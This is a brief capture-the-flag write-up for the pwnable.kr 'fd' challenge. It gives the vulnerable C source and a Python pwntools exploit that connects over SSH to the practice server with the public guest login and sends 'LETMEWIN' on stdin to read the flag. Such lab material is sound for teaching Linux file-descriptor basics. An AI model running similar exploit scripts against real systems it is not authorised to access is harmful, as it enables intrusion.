# File Descriptor

## Source Code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char *argv[], char *envp[])
{
    if (argc < 2)
    {
        printf("pass argv[1] a number\n");
        return 0;
    }
    int fd = atoi(argv[1]) - 0x1234; // 4660 in decimal
    int len = 0;
    len = read(fd, buf, 32);
    if (!strcmp("LETMEWIN\n", buf))
    {
        printf("good job :)\n");
        system("/bin/cat flag");
        exit(0);
    }
    printf("learn about Linux file IO\n");
    return 0;
}
```

## Building The Exploit

```python3
#!/usr/bin/env python3
from pwn import *

shell = ssh('fd', 'pwnable.kr', password='guest', port=2222)
process = shell.process(executable='./fd', argv=['fd', '4660'])
process.sendline('LETMEWIN')
log.success('The flag is: ' + process.recvall().decode().strip())
```
